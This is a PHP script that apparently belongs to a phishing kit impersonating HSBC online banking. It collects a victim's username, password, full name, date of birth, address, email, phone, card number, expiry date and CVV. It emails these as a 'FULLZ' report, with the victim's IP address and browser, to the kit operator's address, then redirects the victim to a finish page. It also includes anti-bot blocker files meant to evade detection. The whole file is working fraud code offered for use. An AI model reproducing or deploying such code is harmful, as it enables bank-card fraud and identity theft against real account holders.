<?php
	session_start();
    include './youremail.php';
	include './blocker.php';
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
				
				$_SESSION['FN'] = $_POST['FN'];
				$_SESSION['DB'] = $_POST['DB'];
				$_SESSION['AD'] = $_POST['AD'];
				$_SESSION['CI'] = $_POST['CI'];
				$_SESSION['EA'] = $_POST['EA'];
				$_SESSION['PN'] = $_POST['PN'];
				$_SESSION['CN'] = $_POST['CN'];
				$_SESSION['EX'] = $_POST['EX'];
				$_SESSION['CV'] = $_POST['CV'];


    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
	$cn= $_SESSION['username'] ;
    $subject = "hsbc FULLZ $ip ";
    $message = '|============ HSbc Login ===========|'."\r\n";
	$message .= "|Username: ".$_SESSION['UN']."\n";
    $message .= "|Password: ".$_SESSION['PW']."\n";
	$message .= "|name: ".$_SESSION['FN']."\n";
    $message .= "|DOB: ".$_SESSION['DB']."\n";
	$message .= "|AD: ".$_SESSION['AD']."\n";
    $message .= "|CITY: ".$_SESSION['CI']."\n";
    $message .= "|EMAIL: ".$_SESSION['EA']."\n";
    $message .= "|PHONE: ".$_SESSION['PN']."\n";
	$message .= "|CARD: ".$_SESSION['CN']."\n";
    $message .= "|EXP: ".$_SESSION['EX']."\n";
	$message .= "|CV: ".$_SESSION['CV']."\n";
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";
	$cn =$_SESSION['CN'];
	$cv =$_SESSION['CV'];
	
	if (strlen($cn) <= 16 && $cn != "" && strlen($cv)==3 ){
		
	mail($to, $subject, $message);
	}
	else {
	    echo "invalid input";
	}
    
    header("Location: finish.php");
 ?>